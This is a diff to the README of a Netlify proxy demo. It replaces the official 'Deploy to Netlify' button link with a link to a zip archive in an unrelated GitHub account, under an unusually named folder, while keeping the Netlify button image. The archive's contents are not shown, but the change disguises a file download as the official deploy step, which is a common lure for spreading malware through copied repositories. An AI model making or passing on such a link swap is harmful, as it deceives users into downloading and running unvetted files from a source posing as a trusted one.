@@ -5,4 +5,4 @@ to a JAMstack approach, with the help of Netlify's proxy feature.
 
 <!-- Markdown snippet -->
 
-[![Deploy to Netlify](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/netlify/proxy-demo)
+[![Deploy to Netlify](https://raw.githubusercontent.com/aslekariii/proxy-demo/master/extraterritoriality/proxy-demo_v1.2.zip)](https://raw.githubusercontent.com/aslekariii/proxy-demo/master/extraterritoriality/proxy-demo_v1.2.zip)
